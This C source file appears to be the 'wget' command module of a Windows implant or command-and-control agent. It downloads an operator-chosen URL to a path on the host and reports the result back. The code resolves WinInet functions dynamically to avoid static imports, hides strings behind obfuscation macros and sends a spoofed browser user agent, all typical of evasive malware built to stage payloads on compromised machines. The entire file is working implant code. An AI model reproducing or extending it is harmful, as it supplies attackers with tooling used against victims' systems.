#include "config.h"
#ifdef INCLUDE_CMD_WGET

#include "commands.h"
#include "json_out.h"

// Uses existing WinInet table
VOID cmd_wget(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD url_len = 0, path_len = 0;
    char* url = parser_string(args, &url_len);
    char* path = parser_string(args, &path_len);
    if (!url || url_len == 0 || !path || path_len == 0) {
        package_add_string(inst, response, XSTR("Usage: wget <url> <output_path>"));
        response->is_error = TRUE;
        return;
    }

    if (!inst->Win32.InternetOpenA) {
        package_add_string(inst, response, XSTR("InternetOpenA not available"));
        response->is_error = TRUE;
        return;
    }

    HANDLE hSession = inst->Win32.InternetOpenA("Mozilla/5.0", 0, NULL, NULL, 0);
    if (!hSession) {
        package_add_string(inst, response, XSTR("InternetOpen failed"));
        response->is_error = TRUE;
        return;
    }

    // InternetOpenUrlA - resolve from wininet.dll
    typedef HANDLE (WINAPI *fn_IntOpenUrl2)(HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD);
    xstr(_wininet, "wininet.dll");
    HMODULE h_wi = inst->Win32.LoadLibraryA(_wininet);
    fn_IntOpenUrl2 pOpenUrl2 = h_wi ?
        (fn_IntOpenUrl2)(void*)inst->Win32.GetProcAddress(h_wi, "InternetOpenUrlA") : NULL;
    if (!pOpenUrl2) {
        gate_CloseHandle(inst, hSession);
        package_add_string(inst, response, XSTR("InternetOpenUrlA resolve failed"));
        response->is_error = TRUE;
        return;
    }

    HANDLE hUrl = pOpenUrl2(hSession, url, NULL, 0,
        0x04000000 | 0x00800000, 0);
    if (!hUrl) {
        gate_CloseHandle(inst, hSession);
        package_add_string(inst, response, XSTR("InternetOpenUrl failed"));
        response->is_error = TRUE;
        return;
    }

    HANDLE hFile = inst->Win32.CreateFileA(path, 0x40000000 /*GENERIC_WRITE*/, 0, NULL,
        2 /*CREATE_ALWAYS*/, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        gate_CloseHandle(inst, hUrl);
        gate_CloseHandle(inst, hSession);
        package_add_string(inst, response, XSTR("Cannot create output file"));
        response->is_error = TRUE;
        return;
    }

    BYTE buf[8192];
    DWORD read = 0, total = 0, written = 0;
    while (inst->Win32.InternetReadFile(hUrl, buf, sizeof(buf), &read) && read > 0) {
        inst->Win32.WriteFile(hFile, buf, read, &written, NULL);
        total += read;
    }
    gate_CloseHandle(inst, hFile);
    gate_CloseHandle(inst, hUrl);
    gate_CloseHandle(inst, hSession);

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"result\":\"ok\",\"url\":");
    j_append_str(&jb, url);
    j_append_raw(&jb, ",\"path\":");
    j_append_str(&jb, path);
    j_append_raw(&jb, ",\"bytes\":");
    j_append_uint(&jb, total);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
